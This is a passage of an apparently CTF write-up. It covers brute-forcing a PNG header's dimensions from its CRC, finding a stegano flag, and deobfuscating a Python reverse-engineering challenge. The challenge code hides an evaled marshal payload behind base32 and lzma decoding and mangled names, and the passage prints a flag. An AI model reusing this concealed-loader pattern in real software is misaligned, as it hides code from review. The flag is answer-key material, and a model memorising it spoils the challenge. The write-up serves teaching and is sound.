ihdr = bytearray(data[index:index+17])
width_index = 7
height_index = 11

for x in range(1,2000):
    height = bytearray(x.to_bytes(2,'big'))
    for y in range(1,2000):
        width = bytearray(y.to_bytes(2,'big'))
        for i in range(len(height)):
            ihdr[height_index - i] = height[-i -1]
        for i in range(len(width)):
            ihdr[width_index - i] = width[-i -1]
        if hex(crc32(ihdr)) == '0x72FAC564'.lower():
            print("width: {} height: {}".format(width.hex(),height.hex()))
    for i in range(len(width)):
            ihdr[width_index - i] = bytearray(b'\x00')[0]
```
</details>

Once we have a valid size (1013x958 in this case), we can fix the file with the correct size by replacing the respective height and width bytes in the IHDR chunk.

#### Steganography
The image is recovered but there's no flag to be seen. So we assume it to be steganographically hidden and launch an image analysis tool such as stegsolve to go through each colour plane. The flag was clearly visible in the red plane as `wgmy{e6fb725a5b2e25429442dbd568ce058e}`.


## Reverse
### Stable
> This is very unstable, and they say python is a stable language

[*Back to top*](#table-of-contents)
<details>
<summary>Source of <code>stable.py</code></summary>

```py
_7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB = vars(__builtins__)
BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3 = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["\x5f_\u0069\155p\u006fr\u0074\137_"]
LZOGJVLBQSWZO7XGEM4T5LXNT4DVYVTI3ITSTEDHBZNDE4ZCLYINMBPIP62 = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("\151\u006esp\x65\U00000063t")
M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["v\x61\U00000072\x73"]
LQJ5TKYMCG4BOHSKBGROAB6LQAJIHIWDW2HHGCYR6CKT5YERSO6GNHYO2Z = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(LZOGJVLBQSWZO7XGEM4T5LXNT4DVYVTI3ITSTEDHBZNDE4ZCLYINMBPIP62)["\147\x65\164\x73\U0000006fu\U00000072\u0063e"]
HZAECZKTOPGGWPUXM6OIA3QEIJ5WVVLB3UY7A2WGCARMXYO5VW7IPQOL4A = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("\U00000073\u0079s")
XWIIZVLEG5Q7Y6DFZVGHO7SS2H6QXSOZABY3MHW63THWNNF5K7QQ3T5SED = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["\x70\162\u0069nt"]
ODZYEJDEIBAQOTUP265UQSON5XNQ6K6VU2JLJCE576B5BMAVMJ2GNSN3EH = LQJ5TKYMCG4BOHSKBGROAB6LQAJIHIWDW2HHGCYR6CKT5YERSO6GNHYO2Z(M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(HZAECZKTOPGGWPUXM6OIA3QEIJ5WVVLB3UY7A2WGCARMXYO5VW7IPQOL4A)["\x6d\U0000006f\144\x75\u006c\U00000065\163"]["_\U0000005f\u006d\141i\u006e\U0000005f_"])
YQZ5ROM4W3C3E7OPYI6BN4XSGG6CAR76JZYGEV73NP6DEUT5MTQ3IVZGVP = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(HZAECZKTOPGGWPUXM6OIA3QEIJ5WVVLB3UY7A2WGCARMXYO5VW7IPQOL4A)["\x61\U00000072g\x76"]
ZA5OAQIR5BNYAB6Q4HSLDPFBKIAW3TPT3YXHESXRX4LHMH4FZHTP4Y57RX = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(HZAECZKTOPGGWPUXM6OIA3QEIJ5WVVLB3UY7A2WGCARMXYO5VW7IPQOL4A)["\u0065\x78i\U00000074"]
ZWDPZJHUEX4LZK6TNL3X7ABBACBY2XZR4HQR6CDVOFLOOHRWAXZGNYD3OF = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("\x72\u0065")
QI5FPMPNP3FNLBUTFG23VRTIRD3QURRB26DVM5X4GYYEDVFCBJRF3T3AEB = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(ZWDPZJHUEX4LZK6TNL3X7ABBACBY2XZR4HQR6CDVOFLOOHRWAXZGNYD3OF)["\x66\u0069\156\x64a\U0000006c\x6c"]
EBNIQQWVCVPSF2UM5T56XXII7MP4MEGGNICNWZ2WU6HXDQSCRRXJGHMPP6 = QI5FPMPNP3FNLBUTFG23VRTIRD3QURRB26DVM5X4GYYEDVFCBJRF3T3AEB('_?([^\n?\\[\\]\']+?)\\s=', ODZYEJDEIBAQOTUP265UQSON5XNQ6K6VU2JLJCE576B5BMAVMJ2GNSN3EH)
QRN64DOU74HGX6YQ7Y5QHLWT2E64375UTTAI3GDVQPJSPR2GZTQLJU6DYX = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["s\164\u0072"]
K3SJIHD3YW5CHGVNKHB4BJ53ZJ6XIM3X2CZQECDLQNIOQNKLEZ5DS6MORP = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(QRN64DOU74HGX6YQ7Y5QHLWT2E64375UTTAI3GDVQPJSPR2GZTQLJU6DYX)["j\157\x69n"]
A7RQQ7PC4WLBAFY3PDAOUOCME5DZMEAR5ZEFBNN2PQKYIAWOPIAA5QSL2J = K3SJIHD3YW5CHGVNKHB4BJ53ZJ6XIM3X2CZQECDLQNIOQNKLEZ5DS6MORP("", EBNIQQWVCVPSF2UM5T56XXII7MP4MEGGNICNWZ2WU6HXDQSCRRXJGHMPP6)
A5CXS7GCTRQQV2G7SFIVU3TI5KZKLUK7TC2GQ7UKMWKPKI6GWR65RFHJK4 = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(QRN64DOU74HGX6YQ7Y5QHLWT2E64375UTTAI3GDVQPJSPR2GZTQLJU6DYX)["\154\x6au\u0073\164"]
GKIJDAGEEVN2IPUHBLY5OL2L2IY4RG64OTGMSMJDZQJMOPMW6L4QCDV7L2 = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("\x6d\141\U00000074\x68")
M74NWW5W4BA35KFV6ROMY3XV4YASUZ733DEDSLTDLJTZUSQBDY7HYAFTVU = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["\U0000006cen"]
P2VMOBU2U7GTIITCNEWRKSATW3CVBQJ5BZKSFEDWDWTJAAFI34KLK7U32U = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(GKIJDAGEEVN2IPUHBLY5OL2L2IY4RG64OTGMSMJDZQJMOPMW6L4QCDV7L2)["\x63e\U00000069\x6c"]
XMW3PCO7YGXIOA6KQXBHSRGPEUHRU5ARLDRDDF7VF74JSTDUM2QKD4NXNQ = 1 << 3
Y6LZNPP33FDJYSFFG72QMET4WKJNNRIGQ2XSSO5676YXW572FRANDC3BGU = A5CXS7GCTRQQV2G7SFIVU3TI5KZKLUK7TC2GQ7UKMWKPKI6GWR65RFHJK4(A7RQQ7PC4WLBAFY3PDAOUOCME5DZMEAR5ZEFBNN2PQKYIAWOPIAA5QSL2J, P2VMOBU2U7GTIITCNEWRKSATW3CVBQJ5BZKSFEDWDWTJAAFI34KLK7U32U(M74NWW5W4BA35KFV6ROMY3XV4YASUZ733DEDSLTDLJTZUSQBDY7HYAFTVU(A7RQQ7PC4WLBAFY3PDAOUOCME5DZMEAR5ZEFBNN2PQKYIAWOPIAA5QSL2J) / XMW3PCO7YGXIOA6KQXBHSRGPEUHRU5ARLDRDDF7VF74JSTDUM2QKD4NXNQ) * XMW3PCO7YGXIOA6KQXBHSRGPEUHRU5ARLDRDDF7VF74JSTDUM2QKD4NXNQ, chr(0x3d))
ZCDX6JR53HGJHYQI6NKQASBSHTVTKYJ4GXG4RENEQS6IEFK3UYSRSSCTPL4 = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("\U00000062a\x73e\U000000364")
ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7 = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["\x6f\162\u0064"]
VRRYA7Q3RVJP4GGXKJJ2RWL3F5B3RFFI4TY3YL2A7CBOLG5CVD5EAMVWRM = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(ZCDX6JR53HGJHYQI6NKQASBSHTVTKYJ4GXG4RENEQS6IEFK3UYSRSSCTPL4)["\U0000006232\U00000064e\143\U0000006fd\145"]
CZ5EDUTIPYA32OYMZI2FHSPUAKIRV2FCDHLDCSLDJ42PUV4EU5QKO57R2A = VRRYA7Q3RVJP4GGXKJJ2RWL3F5B3RFFI4TY3YL2A7CBOLG5CVD5EAMVWRM(Y6LZNPP33FDJYSFFG72QMET4WKJNNRIGQ2XSSO5676YXW572FRANDC3BGU)
FHHTAJYJTNJTF2U7UODGZLRNRHTCD4KSFHJLWQZEATMLW4VJE2QW6OA2475 = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("\u006c\172m\141")
XGDOCXHDIYD4YMH7UZKGOYGEDDGO2FPO3QRELCML5KZTMAXMTG47T2K2I = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["li\u0073\x74"]
ZH7DTVYSP5K53Q6BWIYSLETCPK75NDZX4QKJUONCOYBOJZCETPKRSUAVKW = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(FHHTAJYJTNJTF2U7UODGZLRNRHTCD4KSFHJLWQZEATMLW4VJE2QW6OA2475)["d\U00000065\x63\U0000006fm\u0070\162e\163\x73"]
D3U5DC4TIQARJSIOR6CJG7X3S2EYLBGDVSSJ7HNPYMLPS7IHQILQH7NNY6 = ZH7DTVYSP5K53Q6BWIYSLETCPK75NDZX4QKJUONCOYBOJZCETPKRSUAVKW(CZ5EDUTIPYA32OYMZI2FHSPUAKIRV2FCDHLDCSLDJ42PUV4EU5QKO57R2A)
OHZE337P5F643ACVSLUSMMTSS6TRJG6QFKFNTA7OWIIIQ4CE3PPN4FJHYL = M74NWW5W4BA35KFV6ROMY3XV4YASUZ733DEDSLTDLJTZUSQBDY7HYAFTVU(YQZ5ROM4W3C3E7OPYI6BN4XSGG6CAR76JZYGEV73NP6DEUT5MTQ3IVZGVP)
ENWGRMLCF5R2KMTPBXDXXFWYU2TR3MAQJIA7NZVGNW3P6GNIMGTFISZKVF = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["b\171\U00000074\x65s"]
if OHZE337P5F643ACVSLUSMMTSS6TRJG6QFKFNTA7OWIIIQ4CE3PPN4FJHYL < 2:
    XWIIZVLEG5Q7Y6DFZVGHO7SS2H6QXSOZABY3MHW63THWNNF5K7QQ3T5SED("N\x6ft\40\U00000065nou\147\u0068 \x61\u0072\147\u0075me\x6e\164\u0073")
    ZA5OAQIR5BNYAB6Q4HSLDPFBKIAW3TPT3YXHESXRX4LHMH4FZHTP4Y57RX(1)
ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS = YQZ5ROM4W3C3E7OPYI6BN4XSGG6CAR76JZYGEV73NP6DEUT5MTQ3IVZGVP[1]
QCMBEDAI2CWIXIDOH5A5IS5QD6NB5XL2IX4FNFMUN52YJXXC4PCA23CQ7W = 7
SLKSRY3IAGFOYU3XNCWKHT66TZSP2GY6I5NMWYNCZ7WCVXHLDMIOEWJUQ6 = _7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB["\U00000065\166\U00000061l"]
E2UV76DGSKK7RSUPTTDQ2DUEKAYJ6Q7TGGCCM2MPN2OTGZDAFBSOZJEWZ22 = M74NWW5W4BA35KFV6ROMY3XV4YASUZ733DEDSLTDLJTZUSQBDY7HYAFTVU(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS)
if E2UV76DGSKK7RSUPTTDQ2DUEKAYJ6Q7TGGCCM2MPN2OTGZDAFBSOZJEWZ22 < QCMBEDAI2CWIXIDOH5A5IS5QD6NB5XL2IX4FNFMUN52YJXXC4PCA23CQ7W:
    XWIIZVLEG5Q7Y6DFZVGHO7SS2H6QXSOZABY3MHW63THWNNF5K7QQ3T5SED("\U00000061r\U00000067\x20\151\x73\40t\U0000006f\157\x20\U00000073\x68\u006fr\164")
    ZA5OAQIR5BNYAB6Q4HSLDPFBKIAW3TPT3YXHESXRX4LHMH4FZHTP4Y57RX(1)
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3 = XGDOCXHDIYD4YMH7UZKGOYGEDDGO2FPO3QRELCML5KZTMAXMTG47T2K2I(D3U5DC4TIQARJSIOR6CJG7X3S2EYLBGDVSSJ7HNPYMLPS7IHQILQH7NNY6)
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[235] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[0])
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[515] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[1])
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[507] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[2])
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[519] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[3])
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[1552] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[4])
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[1586] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[5])
SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3[1617] = ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7(ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS[6])
CFUHRDBDBYKZRQTLHSOLMASJAW5DE2A74SVFKIWRTFJCEIDO2OMZFB5QZ = ENWGRMLCF5R2KMTPBXDXXFWYU2TR3MAQJIA7NZVGNW3P6GNIMGTFISZKVF(SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3)
R57WEYHUFJ2L72N5HFD5NOKYEO2LGEMLPK5TAVNZLFTQYJMMVAWVMXYD6L = BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3("m\x61\162\U00000073h\U00000061\154")
CNXXJNEWE4AYG2FRYIIESI35RR3IF4IXNTA4IJJ5N3QRIAAAAPN7GSZQFY = M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ(R57WEYHUFJ2L72N5HFD5NOKYEO2LGEMLPK5TAVNZLFTQYJMMVAWVMXYD6L)["\x6co\u0061\U00000064\x73"]
O4SAAANABOIBGAAAV4ELSDVRYRT7WAQAAAAAABCZLI = CNXXJNEWE4AYG2FRYIIESI35RR3IF4IXNTA4IJJ5N3QRIAAAAPN7GSZQFY(CFUHRDBDBYKZRQTLHSOLMASJAW5DE2A74SVFKIWRTFJCEIDO2OMZFB5QZ)
try:
    SLKSRY3IAGFOYU3XNCWKHT66TZSP2GY6I5NMWYNCZ7WCVXHLDMIOEWJUQ6(O4SAAANABOIBGAAAV4ELSDVRYRT7WAQAAAAAABCZLI)
except:
    XWIIZVLEG5Q7Y6DFZVGHO7SS2H6QXSOZABY3MHW63THWNNF5K7QQ3T5SED("T\150\x69s\u0020\U00000069s \166e\162\u0079 un\x73t\u0061b\x6c\U00000065,\u0020\x68\165\U00000068?")
    ZA5OAQIR5BNYAB6Q4HSLDPFBKIAW3TPT3YXHESXRX4LHMH4FZHTP4Y57RX(1)
```
</details>

#### Name and string
We got an obfuscated code with a lot of crazy name and strings blocking sight, so we'll get them out of the way first.

As the strings are just normal python string with a fancy way of specifying literals, we could `eval` each of them and replace manually, or better yet - write a script to automate this.<br>
<details>
<summary>Example script to deobfuscate string literals</summary>

```py
import re
# regex = re.compile(r"\[(.+?)\]")
regex = re.compile(r"[\(\[](.+?)[\)\]]")

with open("stable.py", "r") as f:
    c = f.read()

for m in regex.findall(c):
    if m.isdigit() or "__import__" in m or m.startswith("_?") or "builtins" in m:
        continue
    try:
        rep = eval(m)
        c = c.replace(m, f"'{rep}'")
    except Exception as e:
        print(f"Skipping: Error {e}")

with open("stablefixed.py", 'w') as f:
    f.write(c)
```
Note: manual cleaning of the generated file is needed after running this script.
</details>

Then, we go through the code and manually renaming all the variables (do it efficiently with a good IDE with variable rename feature).<br>
<details>
<summary>Cleaned code</summary>

```py
g = vars(__builtins__)
g_import = g['__import__']
g_vars = g['vars']
g_print = g['print']

import_sys = g_import('sys')
sys_argv = g_vars(import_sys)['argv']
sys_exit = g_vars(import_sys)['exit']

import_inspect = g_import('inspect')
inspect_getsource = g_vars(import_inspect)['getsource']

orisos = inspect_getsource(g_vars(import_sys)['modules']['__main__'])

i_re = g_import('re')
re_findall = g_vars(i_re)['findall']

i_math = g_import('math')
g_len = g['len']

g_str = g['str']
str_ljust = g_vars(g_str)['ljust']
str_join = g_vars(g_str)['join']

# EBNIQQWVCVPSF2UM5T56XXII7MP4MEGGNICNWZ2WU6HXDQSCRRXJGHMPP6 = re_findall('_?([^\n?\\[\\]\']+?)\\s=', orisos)
strarray = ['7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJB', 'BSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3', 'LZOGJVLBQSWZO7XGEM4T5LXNT4DVYVTI3ITSTEDHBZNDE4ZCLYINMBPIP62', 'M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZ', 'LQJ5TKYMCG4BOHSKBGROAB6LQAJIHIWDW2HHGCYR6CKT5YERSO6GNHYO2Z', 'HZAECZKTOPGGWPUXM6OIA3QEIJ5WVVLB3UY7A2WGCARMXYO5VW7IPQOL4A', 'XWIIZVLEG5Q7Y6DFZVGHO7SS2H6QXSOZABY3MHW63THWNNF5K7QQ3T5SED', 'ODZYEJDEIBAQOTUP265UQSON5XNQ6K6VU2JLJCE576B5BMAVMJ2GNSN3EH', 'YQZ5ROM4W3C3E7OPYI6BN4XSGG6CAR76JZYGEV73NP6DEUT5MTQ3IVZGVP', 'ZA5OAQIR5BNYAB6Q4HSLDPFBKIAW3TPT3YXHESXRX4LHMH4FZHTP4Y57RX', 'ZWDPZJHUEX4LZK6TNL3X7ABBACBY2XZR4HQR6CDVOFLOOHRWAXZGNYD3OF', 'QI5FPMPNP3FNLBUTFG23VRTIRD3QURRB26DVM5X4GYYEDVFCBJRF3T3AEB', 'EBNIQQWVCVPSF2UM5T56XXII7MP4MEGGNICNWZ2WU6HXDQSCRRXJGHMPP6', 'QRN64DOU74HGX6YQ7Y5QHLWT2E64375UTTAI3GDVQPJSPR2GZTQLJU6DYX', 'K3SJIHD3YW5CHGVNKHB4BJ53ZJ6XIM3X2CZQECDLQNIOQNKLEZ5DS6MORP', 'A7RQQ7PC4WLBAFY3PDAOUOCME5DZMEAR5ZEFBNN2PQKYIAWOPIAA5QSL2J', 'A5CXS7GCTRQQV2G7SFIVU3TI5KZKLUK7TC2GQ7UKMWKPKI6GWR65RFHJK4', 'GKIJDAGEEVN2IPUHBLY5OL2L2IY4RG64OTGMSMJDZQJMOPMW6L4QCDV7L2', 'M74NWW5W4BA35KFV6ROMY3XV4YASUZ733DEDSLTDLJTZUSQBDY7HYAFTVU', 'P2VMOBU2U7GTIITCNEWRKSATW3CVBQJ5BZKSFEDWDWTJAAFI34KLK7U32U', 'XMW3PCO7YGXIOA6KQXBHSRGPEUHRU5ARLDRDDF7VF74JSTDUM2QKD4NXNQ', 'Y6LZNPP33FDJYSFFG72QMET4WKJNNRIGQ2XSSO5676YXW572FRANDC3BGU', 'ZCDX6JR53HGJHYQI6NKQASBSHTVTKYJ4GXG4RENEQS6IEFK3UYSRSSCTPL4',
            'ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7', 'VRRYA7Q3RVJP4GGXKJJ2RWL3F5B3RFFI4TY3YL2A7CBOLG5CVD5EAMVWRM', 'CZ5EDUTIPYA32OYMZI2FHSPUAKIRV2FCDHLDCSLDJ42PUV4EU5QKO57R2A', 'FHHTAJYJTNJTF2U7UODGZLRNRHTCD4KSFHJLWQZEATMLW4VJE2QW6OA2475', 'XGDOCXHDIYD4YMH7UZKGOYGEDDGO2FPO3QRELCML5KZTMAXMTG47T2K2I', 'ZH7DTVYSP5K53Q6BWIYSLETCPK75NDZX4QKJUONCOYBOJZCETPKRSUAVKW', 'D3U5DC4TIQARJSIOR6CJG7X3S2EYLBGDVSSJ7HNPYMLPS7IHQILQH7NNY6', 'OHZE337P5F643ACVSLUSMMTSS6TRJG6QFKFNTA7OWIIIQ4CE3PPN4FJHYL', 'ENWGRMLCF5R2KMTPBXDXXFWYU2TR3MAQJIA7NZVGNW3P6GNIMGTFISZKVF', 'ZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWS', 'QCMBEDAI2CWIXIDOH5A5IS5QD6NB5XL2IX4FNFMUN52YJXXC4PCA23CQ7W', 'SLKSRY3IAGFOYU3XNCWKHT66TZSP2GY6I5NMWYNCZ7WCVXHLDMIOEWJUQ6', 'E2UV76DGSKK7RSUPTTDQ2DUEKAYJ6Q7TGGCCM2MPN2OTGZDAFBSOZJEWZ22', 'SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3', 'CFUHRDBDBYKZRQTLHSOLMASJAW5DE2A74SVFKIWRTFJCEIDO2OMZFB5QZ', 'R57WEYHUFJ2L72N5HFD5NOKYEO2LGEMLPK5TAVNZLFTQYJMMVAWVMXYD6L', 'CNXXJNEWE4AYG2FRYIIESI35RR3IF4IXNTA4IJJ5N3QRIAAAAPN7GSZQFY', 'O4SAAANABOIBGAAAV4ELSDVRYRT7WAQAAAAAABCZLI']

# A7RQQ7PC4WLBAFY3PDAOUOCME5DZMEAR5ZEFBNN2PQKYIAWOPIAA5QSL2J = str_join("", strarray)
joinedstr = "7U3XUWC2AAAAJZWWWRDAEABBAELAAAAAOQX6LI7ABGHQLBC5ABYYAMVAJBBSE4E6VG6QTGDVKPB2UN7IFD3XOBR4QRQJE5B42XSBPZ6OSZY2ZWJKXQTW3LZOGJVLBQSWZO7XGEM4T5LXNT4DVYVTI3ITSTEDHBZNDE4ZCLYINMBPIP62M6U5WMD4RLDNXPGONTPAGYB5LPFVTJVQ7FMQCF55WENLFC4T2VQ5TMAZLQJ5TKYMCG4BOHSKBGROAB6LQAJIHIWDW2HHGCYR6CKT5YERSO6GNHYO2ZHZAECZKTOPGGWPUXM6OIA3QEIJ5WVVLB3UY7A2WGCARMXYO5VW7IPQOL4AXWIIZVLEG5Q7Y6DFZVGHO7SS2H6QXSOZABY3MHW63THWNNF5K7QQ3T5SEDODZYEJDEIBAQOTUP265UQSON5XNQ6K6VU2JLJCE576B5BMAVMJ2GNSN3EHYQZ5ROM4W3C3E7OPYI6BN4XSGG6CAR76JZYGEV73NP6DEUT5MTQ3IVZGVPZA5OAQIR5BNYAB6Q4HSLDPFBKIAW3TPT3YXHESXRX4LHMH4FZHTP4Y57RXZWDPZJHUEX4LZK6TNL3X7ABBACBY2XZR4HQR6CDVOFLOOHRWAXZGNYD3OFQI5FPMPNP3FNLBUTFG23VRTIRD3QURRB26DVM5X4GYYEDVFCBJRF3T3AEBEBNIQQWVCVPSF2UM5T56XXII7MP4MEGGNICNWZ2WU6HXDQSCRRXJGHMPP6QRN64DOU74HGX6YQ7Y5QHLWT2E64375UTTAI3GDVQPJSPR2GZTQLJU6DYXK3SJIHD3YW5CHGVNKHB4BJ53ZJ6XIM3X2CZQECDLQNIOQNKLEZ5DS6MORPA7RQQ7PC4WLBAFY3PDAOUOCME5DZMEAR5ZEFBNN2PQKYIAWOPIAA5QSL2JA5CXS7GCTRQQV2G7SFIVU3TI5KZKLUK7TC2GQ7UKMWKPKI6GWR65RFHJK4GKIJDAGEEVN2IPUHBLY5OL2L2IY4RG64OTGMSMJDZQJMOPMW6L4QCDV7L2M74NWW5W4BA35KFV6ROMY3XV4YASUZ733DEDSLTDLJTZUSQBDY7HYAFTVUP2VMOBU2U7GTIITCNEWRKSATW3CVBQJ5BZKSFEDWDWTJAAFI34KLK7U32UXMW3PCO7YGXIOA6KQXBHSRGPEUHRU5ARLDRDDF7VF74JSTDUM2QKD4NXNQY6LZNPP33FDJYSFFG72QMET4WKJNNRIGQ2XSSO5676YXW572FRANDC3BGUZCDX6JR53HGJHYQI6NKQASBSHTVTKYJ4GXG4RENEQS6IEFK3UYSRSSCTPL4ZCGHHSY2HIUON3NW3VCQUCK5LGNAM62WNW47PAO46RFHVWVN4DG42JIV7VRRYA7Q3RVJP4GGXKJJ2RWL3F5B3RFFI4TY3YL2A7CBOLG5CVD5EAMVWRMCZ5EDUTIPYA32OYMZI2FHSPUAKIRV2FCDHLDCSLDJ42PUV4EU5QKO57R2AFHHTAJYJTNJTF2U7UODGZLRNRHTCD4KSFHJLWQZEATMLW4VJE2QW6OA2475XGDOCXHDIYD4YMH7UZKGOYGEDDGO2FPO3QRELCML5KZTMAXMTG47T2K2IZH7DTVYSP5K53Q6BWIYSLETCPK75NDZX4QKJUONCOYBOJZCETPKRSUAVKWD3U5DC4TIQARJSIOR6CJG7X3S2EYLBGDVSSJ7HNPYMLPS7IHQILQH7NNY6OHZE337P5F643ACVSLUSMMTSS6TRJG6QFKFNTA7OWIIIQ4CE3PPN4FJHYLENWGRMLCF5R2KMTPBXDXXFWYU2TR3MAQJIA7NZVGNW3P6GNIMGTFISZKVFZY6U6VY2PEVPRQLYCY47IPREAJQWM3CGARQLVLUYTDY3K4Z66FS3I5EQWSQCMBEDAI2CWIXIDOH5A5IS5QD6NB5XL2IX4FNFMUN52YJXXC4PCA23CQ7WSLKSRY3IAGFOYU3XNCWKHT66TZSP2GY6I5NMWYNCZ7WCVXHLDMIOEWJUQ6E2UV76DGSKK7RSUPTTDQ2DUEKAYJ6Q7TGGCCM2MPN2OTGZDAFBSOZJEWZ22SFBE2D5Q64KKE3V6ID5E7IY34DKU3IH47JQRIPAEQ2776MF2UBZOTS2II3CFUHRDBDBYKZRQTLHSOLMASJAW5DE2A74SVFKIWRTFJCEIDO2OMZFB5QZR57WEYHUFJ2L72N5HFD5NOKYEO2LGEMLPK5TAVNZLFTQYJMMVAWVMXYD6LCNXXJNEWE4AYG2FRYIIESI35RR3IF4IXNTA4IJJ5N3QRIAAAAPN7GSZQFYO4SAAANABOIBGAAAV4ELSDVRYRT7WAQAAAAAABCZLI"

math_ceil = g_vars(i_math)['ceil']
eight = 8
transformedstr = str_ljust(joinedstr, math_ceil(g_len(joinedstr) / eight) * eight, chr(61))

i_base64 = g_import('base64')
g_ord = g['ord']
base64_b32decode = g_vars(i_base64)['b32decode']
